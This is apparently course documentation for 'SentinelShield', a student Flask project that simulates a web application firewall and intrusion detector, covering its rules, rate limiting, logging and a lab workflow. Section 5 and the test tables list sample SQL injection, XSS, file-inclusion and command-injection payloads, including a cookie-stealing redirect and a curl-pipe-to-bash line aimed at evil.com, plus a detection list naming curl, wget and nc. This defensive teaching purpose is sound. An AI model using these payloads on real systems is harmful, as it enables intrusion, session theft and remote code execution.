# PRACTICAL DOCUMENTATION
## SentinelShield: Advanced Intrusion Detection & Web Protection System

---

## 1. Project Overview

SentinelShield is a practical simulation of a **Web Application Firewall (WAF)** and **Intrusion Detection System (IDS)**. It is built using Python Flask and demonstrates how modern security systems inspect, detect, and respond to web-based attacks.

The system does **not** execute any attack payloads. It analyzes submitted text as HTTP request data, applies rule-based detection, and produces real-time security decisions with full logging and dashboard reporting.

This project covers the complete lifecycle of threat detection:

```
Request → Parsing → Rate Check → Pattern Matching → Decision → Logging → Dashboard
```

---

## 2. Scope and Objectives

### Primary Objectives

By completing this practical work, students will be able to:

- Understand how WAFs detect threats using regex-based signature matching
- Analyze HTTP requests from a security perspective (URL, params, headers, body)
- Identify 6 common web attack categories with real-world payloads
- Observe rate limiting behavior and brute-force detection
- Interpret security logs and categorize incidents
- Generate and interpret a practical security report
- Explain the full request → detection → alert pipeline

### Out of Scope

- This system does not connect to external networks
- No actual files are read or executed
- No real database is queried or modified
- This is a learning tool, not a production security system

---

## 3. System Architecture

The system is organized into the following layers:

```
┌─────────────────────────────────────────────────────────┐
│                    WEB BROWSER (Client)                  │
│          Dashboard / Test Page / Logs / Report           │
└─────────────────────┬───────────────────────────────────┘
                      │ HTTP
┌─────────────────────▼───────────────────────────────────┐
│                   FLASK WEB SERVER (app.py)              │
│   Routes: / | /test | /analyze | /logs | /report        │
└───┬──────────────┬──────────────────────────────────────┘
    │              │
    ▼              ▼
┌───────┐   ┌──────────────────────────────────────────┐
│ Rate  │   │            WAF ENGINE (waf/)             │
│Limiter│   │                                          │
│       │   │  rules.py     — Attack signatures        │
│IP     │   │  detector.py  — Inspection engine        │
│Track  │   │  logger.py    — DB + file logging        │
└───────┘   └──────────────────────────────────────────┘
                      │
         ┌────────────┴───────────────┐
         ▼                            ▼
┌─────────────────┐        ┌──────────────────────┐
│  SQLite Database │        │   alerts.log (file)  │
│  (structured)    │        │   (flat text)        │
└─────────────────┘        └──────────────────────┘
```

### Component Descriptions

| Component | File | Responsibility |
|-----------|------|----------------|
| Web Server | `app.py` | Flask routes, request handling, rendering |
| Attack Rules | `waf/rules.py` | Regex pattern definitions for each attack type |
| Detector | `waf/detector.py` | Parses requests, normalizes input, matches rules |
| Rate Limiter | `waf/rate_limiter.py` | IP tracking, threshold enforcement, banning |
| Logger | `waf/logger.py` | SQLite writes, file logs, dashboard stats queries |
| Dashboard | `templates/dashboard.html` | Visual stats, charts, alert feed |
| Test Interface | `templates/test_request.html` | Manual payload submission |

---

## 4. HTTP Request Inspection

A real HTTP request has multiple components. SentinelShield inspects all of them because attackers may hide payloads in any part:

### Request Components Inspected

| Component | Example | Why Inspect? |
|-----------|---------|--------------|
| URL Path | `/admin/../etc/passwd` | Path traversal in URL |
| Query String | `?id=1 OR 1=1` | SQLi in GET parameters |
| Query Params | `search=<script>` | XSS in search fields |
| HTTP Headers | `User-Agent: '; DROP TABLE--` | Header injection |
| POST Body | `username=admin'--` | SQLi in login forms |
| Form Fields | `file=../../../../etc` | LFI in file inputs |

### Normalization Steps

Before matching, all input is normalized to catch obfuscated payloads:

1. **URL Decode**: `%3Cscript%3E` → `<script>`
2. **Double URL Decode**: `%253Cscript` → `<script>` (double-encoded evasion)
3. **Lowercase**: `SELECT` / `Select` / `sElEcT` → `select`
4. **Whitespace collapse**: Multiple spaces → single space

This prevents attackers from bypassing detection by encoding or mixing case.

---

## 5. Attack Signature Detection

### How the Rule Engine Works

Each attack category has a list of regex patterns. For every incoming request part, the engine checks it against all patterns for all rules.

```
for each request_field (URL, params, headers, body):
    normalized = normalize(field_value)
    for each rule in ATTACK_RULES:
        for each pattern in rule.patterns:
            if re.search(pattern, normalized):
                → Record detection (rule_name, severity, matched_text)
                → break (one match per rule per field)
```

### Attack Category Reference

#### 1. SQL Injection (CRITICAL)
**What it is:** Inserting SQL commands into input to manipulate the database.

**How it's detected:**
- SQL keywords: `SELECT`, `UNION`, `INSERT`, `DROP`, `DELETE`
- Comment markers: `--`, `/*`, `;`
- Bypass patterns: `OR '1'='1`, `AND 1=1`
- Time-based: `SLEEP()`, `WAITFOR DELAY`
- Schema access: `INFORMATION_SCHEMA`

**Example payloads:**
```
' OR '1'='1
1; DROP TABLE users--
UNION SELECT username, password FROM users
```

**Real-world impact:** Can dump entire databases, bypass logins, delete data, or execute OS commands.

---

#### 2. Cross-Site Scripting — XSS (HIGH)
**What it is:** Injecting JavaScript that runs in other users' browsers.

**How it's detected:**
- Script tags: `<script>`, `</script>`
- JavaScript protocol: `javascript:`
- Event handlers: `onerror=`, `onload=`, `onclick=`
- Dangerous tags: `<iframe>`, `<embed>`, `<object>`
- DOM access: `document.cookie`, `document.location`

**Example payloads:**
```
<script>alert(document.cookie)</script>
<img src=x onerror=alert(1)>
javascript:void(document.location='http://evil.com?c='+document.cookie)
```

**Real-world impact:** Session hijacking, credential theft, page defacement, phishing redirects.

---

#### 3. Local File Inclusion — LFI (CRITICAL)
**What it is:** Reading arbitrary files from the server's filesystem via file path parameters.

**How it's detected:**
- Sensitive Linux files: `/etc/passwd`, `/etc/shadow`, `/proc/self/environ`
- PHP wrappers: `php://filter`, `php://input`
- Windows files: `C:\Windows\System32`
- Log files: `/var/log/`, `/var/www/`

**Example payloads:**
```
../../../../etc/passwd
php://filter/convert.base64-encode/resource=config.php
/proc/self/environ
```

**Real-world impact:** Reading credentials, source code, configuration files. Can escalate to RCE via log poisoning.

---

#### 4. Directory Traversal (HIGH)
**What it is:** Using `../` sequences to navigate outside the web root directory.

**How it's detected:**
- Multiple traversal sequences: `../../../`
- URL-encoded variants: `%2e%2e%2f`, `%252e%252e`
- Windows variants: `..\..\..\`
- Obfuscated: `....//....//`, `..;/`

**Example payloads:**
```
../../../windows/system32
..%2F..%2F..%2Fetc%2Fpasswd
%252e%252e%252fetc%252fpasswd
```

**Real-world impact:** Accessing files outside the intended directory, reading config files, reaching system files.

---

#### 5. Command Injection (CRITICAL)
**What it is:** Injecting OS shell commands into input that gets executed by the server.

**How it's detected:**
- Semicolon + command: `; ls`, `; cat`
- Pipe operator: `| whoami`
- AND operator: `&& id`
- Command substitution: `$(command)`, `` `command` ``
- Shell paths: `/bin/bash`, `/bin/sh`
- Network tools: `curl`, `wget`, `nc`

**Example payloads:**
```
; cat /etc/passwd
| whoami
&& curl http://evil.com/shell.sh | bash
$(python3 -c "import os; os.system('id')")
```

**Real-world impact:** Full server compromise — arbitrary code execution, reverse shells, data exfiltration.

---

#### 6. Path Manipulation (MEDIUM)
**What it is:** Using special characters or encoding to bypass path-based filters.

**How it's detected:**
- Null byte injection: `%00`
- CRLF injection: `%0d%0a`
- Direct script access: `.php`, `.asp`, `.jsp` at end of path
- Wildcard paths: `*.php`

---

## 6. Rate Limiting

### Purpose

Rate limiting prevents brute-force attacks, credential stuffing, and flooding by tracking how many requests each IP address sends in a time window.

### Configuration (in `waf/rate_limiter.py`)

| Parameter | Default | Description |
|-----------|---------|-------------|
| `TIME_WINDOW` | 60 seconds | Sliding window for counting requests |
| `MAX_REQUESTS` | 30 | Requests above this = BAN |
| `SUSPICIOUS_THRESHOLD` | 20 | Requests above this = SUSPICIOUS |
| `BAN_DURATION` | 300 seconds | How long a banned IP stays banned |

### Status Levels

| Status | Condition | Action |
|--------|-----------|--------|
| `OK` | ≤ 20 requests in window | Request proceeds normally |
| `SUSPICIOUS` | 21–30 requests in window | Request proceeds + IP flagged |
| `RATE_LIMITED` | > 30 requests in window | Request blocked + IP banned |
| `BANNED` | Active ban on IP | All requests blocked until ban expires |

### How to Test Rate Limiting

On the Test Requests page, submit more than 30 requests within 60 seconds. After the 20th, you'll see `SUSPICIOUS` status. After the 30th, the IP will be banned and all subsequent requests will show `BANNED`.

---

## 7. Logging System

SentinelShield uses dual logging for different use cases:

### SQLite Database (`database/sentinelshield.db`)

Two tables are maintained:

**`request_logs`** — One row per request:
- `timestamp`, `ip_address`, `method`, `path`, `query`
- `status` (ALLOWED/BLOCKED/RATE_LIMITED/BANNED)
- `is_malicious` (0/1)
- `attack_categories` (JSON array)
- `severity` (NONE/LOW/MEDIUM/HIGH/CRITICAL)
- `summary` (human-readable detection result)
- `detections` (full JSON of all pattern matches)
- `rate_status` (OK/SUSPICIOUS/RATE_LIMITED/BANNED)

**`alerts`** — One row per individual attack detection:
- `timestamp`, `ip_address`
- `attack_type` (SQL Injection, XSS, etc.)
- `severity`, `description`, `path`
- `log_id` (foreign key to request_logs)

### File Log (`logs/alerts.log`)

Each blocked request writes a line like:
```
2025-01-15 14:23:01 | WARNING | [BLOCKED] IP=192.168.1.50 Method=POST Path=/login | Severity=CRITICAL | Categories=['sqli'] | BLOCKED: Detected SQL Injection [CRITICAL]
```

This flat format is easy to grep, tail, or feed into external SIEM tools.

---

## 8. Dashboard Interpretation

### Stat Cards (Top Row)
- **Total Requests**: All requests processed since last reset
- **Threats Blocked**: Requests that matched attack signatures
- **Requests Allowed**: Clean requests that passed inspection
- **Rate Limited**: Requests blocked due to IP flooding

### Attack Type Chart (Doughnut)
Shows proportion of each attack category detected. A high proportion of SQL Injection suggests automated scanning; XSS suggests targeted payload testing.

### Severity Distribution (Bar Chart)
Shows CRITICAL/HIGH/MEDIUM/LOW counts. Helps prioritize response — CRITICAL severity events (SQLi, Command Injection, LFI) require immediate attention.

### Flagged IPs Panel
Lists IP addresses that have triggered attacks, with attack counts and types. A single IP with multiple attack types is a strong indicator of active penetration testing or automated scanning.

### Recent Alerts Feed
Live stream of the most recent detections. Review this to understand current threat activity.

### Detection Pipeline Diagram
Visual reminder of the 6-step request processing flow: Receive → Rate Check → Parse → Rule Match → Block/Allow → Log.

---

## 9. Practical Workflow

### Step 1: Start the System
```bash
pip install -r requirements.txt
python app.py
# Open http://127.0.0.1:5000
```

### Step 2: Baseline — Submit Normal Requests
- Go to Test Requests page
- Expand the "Normal Requests" accordion
- Click and submit 3–4 safe payloads
- Confirm all show **ALLOWED** status

### Step 3: Test SQL Injection
- Submit: `' OR '1'='1`
- Observe: BLOCKED, CRITICAL severity, category: `sqli`
- Note the matched pattern in the detection details
- Submit 2 more SQLi variants from the sample list

### Step 4: Test XSS
- Submit: `<script>alert(document.cookie)</script>`
- Observe: BLOCKED, HIGH severity
- Try the encoded variant: `%3Cscript%3Ealert(1)%3C%2Fscript%3E`
- Observe: Still BLOCKED (normalization decodes it first)

### Step 5: Test LFI + Directory Traversal
- Submit: `../../../../etc/passwd` → BLOCKED (CRITICAL)
- Submit: `..%2F..%2F..%2Fetc%2Fpasswd` → BLOCKED (URL-encoded)
- Explain: Both are the same attack, different encoding

### Step 6: Test Command Injection
- Submit: `; cat /etc/passwd` → BLOCKED (CRITICAL)
- Submit: `&& whoami` → BLOCKED (CRITICAL)

### Step 7: Test Rate Limiting
- Rapidly submit the same safe payload 25+ times
- Watch SUSPICIOUS appear, then RATE_LIMITED/BANNED

### Step 8: Review Dashboard
- Navigate to `/`
- Observe the charts updating with attack data
- Check Flagged IPs panel
- Review Recent Alerts feed

### Step 9: Review Logs
- Navigate to `/logs`
- Filter by BLOCKED
- Note timestamps, IPs, categories, severity

### Step 10: Generate Report
- Navigate to `/report`
- Review the executive summary, attack table, recommendations
- Print or screenshot for submission

---

## 10. Output Expectations

After completing the practical session, you should have:

### Observable Outputs

| Output | Location | Content |
|--------|----------|---------|
| Detection Results | Test page | Status, severity, matched patterns per payload |
| Request Logs | `/logs` | Timestamped table of all processed requests |
| SQLite DB | `database/sentinelshield.db` | Structured data queryable with any SQLite browser |
| Alert Log File | `logs/alerts.log` | Flat text file of all blocked requests |
| Dashboard Charts | `/` | Visual breakdown of attack types and severities |
| Security Report | `/report` | Auto-generated summary with recommendations |

### Expected Log Entry (BLOCKED Request)

| Field | Example Value |
|-------|--------------|
| Timestamp | 2025-01-15 14:30:00 |
| IP Address | 127.0.0.1 |
| Method | POST |
| Path | /login |
| Status | BLOCKED |
| Severity | CRITICAL |
| Categories | sqli |
| Summary | BLOCKED: Detected SQL Injection [CRITICAL] |

### Expected Observation Notes (Student)

For each test, document:
1. **What was submitted** — exact payload
2. **What was detected** — rule triggered, pattern matched
3. **System response** — BLOCKED/ALLOWED, severity
4. **Why it matters** — real-world impact of this attack type
5. **How to prevent it** — secure coding countermeasure

---

## 11. Sample Test Report

---

### Practical Session Report
**Project:** SentinelShield IDS/WAF  
**Date:** [Fill in date]  
**Student:** [Fill in name]  

---

#### Summary Statistics

| Metric | Value |
|--------|-------|
| Total requests submitted | 25 |
| Malicious requests detected | 18 |
| Safe requests allowed | 5 |
| Rate-limited requests | 2 |
| Detection rate | 100% |
| False positives | 0 |

---

#### Attack Test Results

| # | Payload Submitted | Attack Type | Detected? | Severity |
|---|-------------------|-------------|-----------|----------|
| 1 | `Hello world` | — (safe) | ✅ ALLOWED | NONE |
| 2 | `product=123` | — (safe) | ✅ ALLOWED | NONE |
| 3 | `' OR '1'='1` | SQL Injection | ✅ BLOCKED | CRITICAL |
| 4 | `UNION SELECT * FROM users` | SQL Injection | ✅ BLOCKED | CRITICAL |
| 5 | `<script>alert(1)</script>` | XSS | ✅ BLOCKED | HIGH |
| 6 | `<img src=x onerror=alert(document.cookie)>` | XSS | ✅ BLOCKED | HIGH |
| 7 | `../../../../etc/passwd` | LFI + Traversal | ✅ BLOCKED | CRITICAL |
| 8 | `php://filter/resource=config.php` | LFI | ✅ BLOCKED | CRITICAL |
| 9 | `../../../windows/system32` | Dir Traversal | ✅ BLOCKED | HIGH |
| 10 | `; cat /etc/passwd` | Command Injection | ✅ BLOCKED | CRITICAL |
| 11 | `&& whoami` | Command Injection | ✅ BLOCKED | CRITICAL |
| 12 | `%3Cscript%3Ealert(1)` | XSS (encoded) | ✅ BLOCKED | HIGH |

---

#### Key Observations

1. **Normalization is effective**: URL-encoded XSS payload `%3Cscript%3E` was decoded and detected correctly. This demonstrates why input normalization is a critical WAF component.

2. **Multiple rule matches**: The payload `../../../../etc/passwd` triggered both the LFI rule (matches `/etc/passwd`) and the Directory Traversal rule (matches `../` sequences), demonstrating that attacks can be detected via multiple signatures.

3. **Rate limiting activated**: After submitting 25 requests rapidly, the IP was flagged as SUSPICIOUS, confirming the brute-force detection mechanism works correctly.

4. **Zero false positives**: All safe/normal payloads were allowed correctly. No legitimate requests were misidentified as attacks.

---

#### Security Recommendations

| Priority | Recommendation |
|----------|----------------|
| CRITICAL | Use parameterized queries to prevent SQL Injection |
| HIGH | Implement Content Security Policy (CSP) headers against XSS |
| CRITICAL | Validate and whitelist all file paths; never pass user input to filesystem functions |
| CRITICAL | Never construct shell commands from user input; use safe API alternatives |
| MEDIUM | Lower rate limit threshold for authentication endpoints |
| MEDIUM | Add CAPTCHA after 5 failed login attempts |

---

#### Conclusion

SentinelShield successfully detected all submitted attack payloads with 100% accuracy and zero false positives. The detection pipeline (rate limiting → request parsing → rule matching → logging) functioned as expected. The dashboard provided clear real-time visibility into the attack patterns and flagged IP addresses.

---

*End of Practical Documentation*